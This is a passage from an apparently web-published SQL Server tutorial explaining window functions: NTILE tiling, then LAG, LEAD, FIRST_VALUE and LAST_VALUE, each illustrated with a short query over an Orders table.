class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b29990a691112566-5">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-104.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-104.png" /></noscript>
</p>
<p>
  NTILE creates tiles based on following formula:
</p>
<p>
  No of rows in each tile = number of rows in result set / number of tiles specified 
</p>
<p>
  Here is our example, we have total 10 rows and 4 tiles are specified in the query so number of rows in each tile will be 2.5 (10/4).  As number of rows should be whole number, not a decimal.  SQL engine will assign 3 rows for first two groups and 2 rows for remaining two groups. 
</p>
<h2>Value Window Functions </h2>
<p>
  Value window functions are used to find first, last, previous and next values. The functions that can be used are LAG(), LEAD(), FIRST_VALUE(), LAST_VALUE()
</p>
<p><strong>LAG() and LEAD()</strong>
</p>
<p>
  LEAD() and LAG() functions are very powerful but can be complex to explain. 
</p>
<p>
  As this is an introductory article below we are looking at a very simple example to illustrate how to use them.
</p>
<p>
  The LAG function allows to access data from the previous row in the same result set without use of any SQL joins. You can see in below example, using LAG function we found previous order date.
</p>
<p>
  Script to find previous order date using LAG() function:
</p>

		<div id="crayon-5b9189b29990e313820953" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b29990e313820953-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b29990e313820953-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b29990e313820953-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b29990e313820953-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b29990e313820953-5" style="height: 15px;">5</div><div class="crayon-num" data-line="crayon-5b9189b29990e313820953-6" style="height: 15px;">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b29990e313820953-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b29990e313820953-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_amount</span><span class="crayon-sy">,</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b29990e313820953-3"><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">below </span><span class="crayon-v">line</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">indicates </span><span class="crayon-e">check </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-e">previous </span><span class="crayon-e">row </span><span class="crayon-e">of </span><span class="crayon-e">the </span><span class="crayon-e">current </span><span class="crayon-e">row</span></div><div class="crayon-line" id="crayon-5b9189b29990e313820953-4"><span class="crayon-e"> </span><span class="crayon-e">LAG</span><span class="crayon-sy">(</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-v">order_date</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">prev_order_date</span></div><div class="crayon-line" id="crayon-5b9189b29990e313820953-5"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b29990e313820953-6">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-105.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-105.png" /></noscript>
</p>
<p>
  LEAD function allows to access data from the next row in the same result set without use of any SQL joins. You can see in below example, using LEAD function we found next order date.
</p>
<p>
  Script to find next order date using LEAD() function:
</p>

		<div id="crayon-5b9189b299912596197941" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b299912596197941-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b299912596197941-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b299912596197941-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b299912596197941-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b299912596197941-5" style="height: 15px;">5</div><div class="crayon-num" data-line="crayon-5b9189b299912596197941-6" style="height: 15px;">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b299912596197941-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b299912596197941-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_amount</span><span class="crayon-sy">,</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b299912596197941-3"><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">below </span><span class="crayon-v">line</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">indicates </span><span class="crayon-e">check </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-e">next </span><span class="crayon-e">row </span><span class="crayon-e">of </span><span class="crayon-e">the </span><span class="crayon-e">current </span><span class="crayon-e">row</span></div><div class="crayon-line" id="crayon-5b9189b299912596197941-4"><span class="crayon-e"> </span><span class="crayon-e">LEAD</span><span class="crayon-sy">(</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-v">order_date</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">next_order_date</span></div><div class="crayon-line" id="crayon-5b9189b299912596197941-5"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b299912596197941-6">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-106.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-106.png" /></noscript>
</p>
<p><strong>FIRST_VALUE() and LAST_VALUE()</strong>
</p>
<p>
  These functions help you to identify first and last record within a partition or entire table if <b>PARTITION BY</b> is not specified. 
</p>
<p>
  Let’s find the first and last order of each city from our existing dataset. Note ORDER BY clause is mandatory for FIRST_VALUE() and LAST_VALUE() functions
</p>

		<div id="crayon-5b9189b299917170082938" class="crayon-syntax crayon-theme-ssms2012 crayon-font-courier-new crayon-os-pc print-yes notranslate crayon-wrapped" data-settings=" no-popup minimize scroll-always disable-anim wrap" style="margin-top: 15px; margin-bottom: 15px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-plain-wrap"></div>
			<div class="crayon-main" style="position: relative; z-index: 1;">
				<table class="crayon-table" style="margin-left: -1px;">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5b9189b299917170082938-1" style="height: 15px;">1</div><div class="crayon-num" data-line="crayon-5b9189b299917170082938-2" style="height: 15px;">2</div><div class="crayon-num" data-line="crayon-5b9189b299917170082938-3" style="height: 15px;">3</div><div class="crayon-num" data-line="crayon-5b9189b299917170082938-4" style="height: 15px;">4</div><div class="crayon-num" data-line="crayon-5b9189b299917170082938-5" style="height: 15px;">5</div><div class="crayon-num" data-line="crayon-5b9189b299917170082938-6" style="height: 15px;">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5b9189b299917170082938-1">&nbsp;</div><div class="crayon-line" id="crayon-5b9189b299917170082938-2"><span class="crayon-e">SELECT </span><span class="crayon-v">order_id</span><span class="crayon-sy">,</span><span class="crayon-v">order_date</span><span class="crayon-sy">,</span><span class="crayon-v">customer_name</span><span class="crayon-sy">,</span><span class="crayon-v">city</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">order_amount</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b299917170082938-3"><span class="crayon-e">FIRST_VALUE</span><span class="crayon-sy">(</span><span class="crayon-v">order_date</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-e">city </span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-v">city</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">first_order_date</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-5b9189b299917170082938-4"><span class="crayon-e">LAST_VALUE</span><span class="crayon-sy">(</span><span class="crayon-v">order_date</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">OVER</span><span class="crayon-sy">(</span><span class="crayon-e">PARTITION </span><span class="crayon-e">BY </span><span class="crayon-e">city </span><span class="crayon-e">ORDER </span><span class="crayon-e">BY </span><span class="crayon-v">city</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">last_order_date</span></div><div class="crayon-line" id="crayon-5b9189b299917170082938-5"><span class="crayon-i">FROM</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">dbo</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-sy">[</span><span class="crayon-v">Orders</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5b9189b299917170082938-6">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<p>
  <img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-107.png"><noscript><img style="margin: 0px auto; display: block;" src="/wp-content/uploads/2017/06/word-image-107.png" /></noscript>
</p>
<p>
  From the above image, we can clearly see that first order received on 2017-04-02 and last order received on 2017-04-11 for Arlington city and it works the same for other cities.
</p>
			
		</div>
</body>
</html>
